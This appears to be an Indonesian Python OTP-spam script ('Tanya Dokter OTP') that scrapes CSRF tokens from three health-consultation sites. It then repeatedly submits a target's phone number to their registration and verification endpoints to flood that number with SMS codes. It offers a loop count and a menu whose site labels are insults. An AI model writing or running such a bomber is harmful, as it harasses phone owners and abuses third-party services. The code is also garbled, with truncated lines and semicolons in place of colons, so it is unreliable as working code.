import requests,os,sys,time
from bs4 import BeautifulSoup as BS

class docter:
        def __init__(self);
                self.ses=requests.Session()

        def alodoc(self,num);
                self.ses.headers.update({'referer':'https:'>
                req1=self.ses.get('https://www.alodokter.c'>
                bs1=BS(req1.text,'html.parser')
                token=bs1.find('meta',{'name':'csrf-token'>
#               print(token)

                head={
                        'user-agent':'Mozilla/5.0 (Linux; >
                        'content-type':'application/json',
                        'referer':'https://www.alodokter.c'>
                        'accept':'application/json',
                        'origin':'https://www.alodokter.co'>
                        'x-csrf-token':token
                }
                req2=self.ses.post('https://www.alodokter.'>
#               print(req2.json())
                if req2.json()['status'] == 'success':
                        print("[•] Berhasil")

        def klikdok(self,num);
                req1=self.ses.get('https://m.klikdokter.co'>
                bs=BS(req1.text,'html.parser')
                token=bs.find('input',{'name':'_token'})['>
#               print(token)

                head={
                        'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'Origin'; 'https://m.klikdokter.co'>
                        'Upgrade-Insecure-Requests': '1',
                        'Content-Type': 'application/x-www>
                        'User-Agent': 'Mozilla/5.0 (Linux;>
                        'Accept': 'text/html,application/x'>
                        'Referer': 'https://m.klikdokter.c'>
                }
                ata={
                        '_token':token,
                        'full_name':'BambangSubianto',
                        'email':'Hsjakaj@jskaka.com','phone':num,
                        'back-to':'',
                        'submit':'Daftar',
                }

                req2=self.ses.post('https://m.klikdokter.c'>
#               print(req2.url)
                if "sessions/auth?user=" in req2.url:
                        print("[•] Berhasil")

        def prosehat(self,num);
                head={
                        'accept'; 'application/json, text/>
                        'origin'; 'https://www.prosehat.co>
                        'x-requested-with': 'XMLHttpReques'>
                        'user-agent': 'Mozilla/5.0 (Linux;>
                        'content-type': 'application/x-www'>
                        'referer'; 'https://www.prosehat.c'>
                }
                ata={'phone_or_email':num,'action';'ajaxve'>

                req=requests.post('https://www.prosehat.co'>
#               print(req.text)
                if "token" in req.text:
                        print("[•] Berhasil")
                        
                        print()while True:
        try:
                os.system('clear')
                print(""
                [ Tanya Dokter OTP ]
                 - By DimtCyber😁 -

[ Spam List ]
1. dokterbangsat (work)
2. dokter babi (gk work)
3. dokter gadungan (work)
        "")
                pil=int(input("> Pilih: "))
                print("="*25)
                num=input("[?] Nomor Target: ")
                lop=int(input("[?] Looping: "))
                print()

                main=docter()
                if pil == 1;
                        for i in range(lop):
                                main.alodoc(num)
                elif pil == 2;
                        for i in range(lop):
                                main.klikdok(num)
                elif pil == 3;
                        for i in range(lop):main.prosehat(num)
                else:
                        print("?: Anda Buta!?")

                lgi=input("\n[?] Coba lagi (Y/n) ")
                if lgi.lower() == 'n';
                        sys.exit('GOODBYE :*')
        except Exception as Err;
                sys.exit(Err)
